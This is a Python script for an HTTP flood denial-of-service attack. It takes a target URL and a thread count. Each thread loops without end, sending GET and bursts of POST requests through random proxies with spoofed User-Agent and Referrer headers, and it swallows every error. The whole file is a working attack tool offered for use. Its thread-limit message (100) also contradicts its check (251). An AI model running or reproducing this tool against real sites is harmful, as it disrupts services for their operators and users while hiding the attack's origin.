from requests   import request
from threading  import Thread
from random     import choice

from data.theme import C
from data.spoof import PROXIES,USERAGENTS,REFERRERS


    

def flood_url(URL: str) -> None:
    while True:
        try:
            #turn PROXIES into a list and choose a random one.
            proxy = choice(list(PROXIES))
            #send get request.
            r = request(
                method  = 'GET',
                url     = URL, 
                headers = {'User-Agent': choice(USERAGENTS), 'Referrer': choice(REFERRERS)},
                proxies = {'http': f'http://{proxy}','https': f'http://{proxy}'}
            ); r.close()
            print(f'{C.lime}• {C.white}Request sent, proxy: {C.violet}{proxy}')
            #send post request 10 times.
            for _ in range(10):
                r = request(
                    method  = 'POST',
                    url     = URL, 
                    headers = {'User-Agent': choice(USERAGENTS), 'Referrer': choice(REFERRERS)},
                    proxies = {'http': f'http://{proxy}','https': f'http://{proxy}'}
                ); r.close()
                print(f'{C.lime}• {C.white}Request sent, proxy: {C.violet}{proxy}')
        except:
            pass
            
if __name__ == '__main__':
    print(C.banner)
    print(f'{C.white}Proxies: {C.lime}{len(PROXIES)}{C.white}\n')
    
    URL  = input(f'{C.white}URL:{C.cyan} ')
    
    while True:
        threads = int(input(f'{C.white}Threads (1-250):{C.cyan} '))
        
        if not threads > 251:
            break
            
        if not threads:
            threads = 250 ; break
            
        print(f'{C.red}Thread limit is 100.{C.white}\n')
        
    print(f'{C.white}Using {C.lime}{threads} {C.white}threads.')    
    print(f'{C.white}Flooding {C.cyan}{URL}{C.white} with {C.cyan}{len(PROXIES)} {C.white}proxies...\n')
    
    for _ in range(threads):
        Thread(target = flood_url, args = [URL]).start()
